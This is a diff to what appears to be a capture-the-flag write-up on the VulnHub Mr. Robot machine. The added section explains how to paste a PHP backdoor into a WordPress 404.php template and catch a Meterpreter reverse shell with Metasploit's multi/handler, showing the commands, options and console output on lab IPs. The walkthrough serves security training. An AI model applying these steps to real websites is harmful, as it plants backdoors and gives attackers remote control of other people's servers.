@@ -2344,17 +2344,200 @@ Payload size: 1116 bytes
 We have created our own php backdoor (better than using someone elses right!) we can now use this to gain access to our target machine! We need to copy everything from <?php until die(); and past that into the 404.php template on the website.
 <p></p>
 <div align="center">
-<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/64159a7f62f979c03a07cfa9cd9523281c1901c0/Starting_Point/VulnHub/MrRobot/images/inside404template.png"><br>
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/90fc96ea3dd2737b0d4fe8d63e15eeb3fc3df0b3/Starting_Point/VulnHub/MrRobot/images/insidephp.png"><br>
 </div>
 <p></p>
+Once you have pasted the exploit we created click update file to upload the backdoor. Now we need to start up msfconsole to catch the reverse shell. To start mfsconsole run the following command:
+<p></p>
 
-
-
-
-
-
+```
+msfconsole
+```
 
 <p></p>
+Which outputs (the banner will be different for you):
+<p></p>
+
+```
+❯ msfconsole
+                                                  
+                                              `:oDFo:`                            
+                                           ./ymM0dayMmy/.                          
+                                        -+dHJ5aGFyZGVyIQ==+-                    
+                                    `:sm⏣~~Destroy.No.Data~~s:`                
+                                 -+h2~~Maintain.No.Persistence~~h+-              
+                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
+                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
+                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
+                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
+                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
+                      :we're.all.alike'`                     The.PFYroy.No.D7:  
+                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
+                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
+                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
+                      :<script>.Ac816/                        sENbove3101.404:    
+                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
+                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
+                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
+                      :#OUTHOUSE-  -s:                       /corykennedyData:    
+                      :$nmap -oS                              SSo.6178306Ence:    
+                      :Awsm.da:                            /shMTl#beats3o.No.:    
+                      :Ring0:                             `dDestRoyREXKC3ta/M:    
+                      :23d:                               sSETEC.ASTRONOMYist:    
+                       /-                        /yo-    .ence.N:(){ :|: & };:    
+                                                 `:Shall.We.Play.A.Game?tron/    
+                                                 ```-ooy.if1ghtf0r+ehUser5`    
+                                               ..th3.H1V3.U2VjRFNN.jMh+.`          
+                                              `MjM~~WE.ARE.se~~MMjMs              
+                                               +~KANSAS.CITY's~-`                  
+                                                J~HAKCERS~./.`                    
+                                                .esc:wq!:`                        
+                                                 +++ATH`                            
+                                                  `
+
+
+       =[ metasploit v6.0.44-dev                          ]
++ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 8 evasion                                       ]
+
+Metasploit tip: After running db_nmap, be sure to 
+check out the result of hosts and services
+
+msf6 > 
+```
+
+<p></p>
+In the console enter the following:
+<p></p>
+
+```
+use exploit/multi/handler
+```
+
+<p></p>
+Which will change your shell input to:
+<p></p>
+
+```
+msf6 exploit(multi/handler) >
+```
+
+<p></p>
+This lets us know we are inside the multi/handler module, next we need to see the options for this module, to do this we enter the following:
+<p></p>
+
+```
+show options
+```
+
+<p></p>
+which outputs:
+<p></p>
+
+```
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+```
+
+<p></p>
+Here we can see the options we need to set, being 'payload','LHOST' and 'LPORT', we will start with setting the payload by entering:
+<p></p>
+
+```
+set payload php/meterpreter/reverse_tcp
+```
+
+<p></p>
+Next we will set the LHOST by entering:
+<p></p>
+
+```
+set LHOST 192.168.125.134
+```
+
+<p></p>
+And finally we will set the lport by entering:
+<p></p>
+
+```
+set LPORT 1337
+```
+
+<p></p>
+We can confirm this was all set by again entering 'show options' which outputs:
+<p></p>
+
+```
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.125.134  yes       The listen address (an interface may be specified)
+   LPORT  1337             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+```
+
+<p></p>
+We can see this was all accepted so we will now run this module by entering:
+<p></p>
+
+```
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 192.168.125.134:1337 
+```
+
+<p></p>
+This is now running and will hang untill a conection is initiated with it. We will now run the reverse shell script we uploaded to the site previously.
+<br>
+To do this we need to navigate to the following webpage:
+<p></p>
+
+```
+http://192.168.125.132/wp-content/themes/twentyfourteen/404.php
+```
+
+<p></p>
+
+
+
+
+
+
 
 
 
